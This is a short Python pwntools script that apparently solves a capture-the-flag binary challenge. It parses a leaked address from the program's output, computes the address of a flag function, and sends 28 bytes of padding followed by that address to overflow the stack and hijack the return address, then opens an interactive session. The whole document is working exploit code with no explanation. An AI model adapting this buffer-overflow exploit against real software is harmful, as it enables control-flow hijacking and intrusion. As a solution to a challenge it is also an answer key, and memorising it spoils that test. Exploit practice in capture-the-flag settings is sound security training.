#!/usr/bin/env python

from pwn import *

elf = ELF('./pwn')
p = elf.process()

address_start = int(p.recv().decode().split('\n')[-3].split('0x')[-1],16)
address_flag_function = address_start - 126

payload = [
    b'A' * 28,
    p32(address_flag_function)
]

payload = b"".join(payload)

p.sendline(payload)
p.interactive()
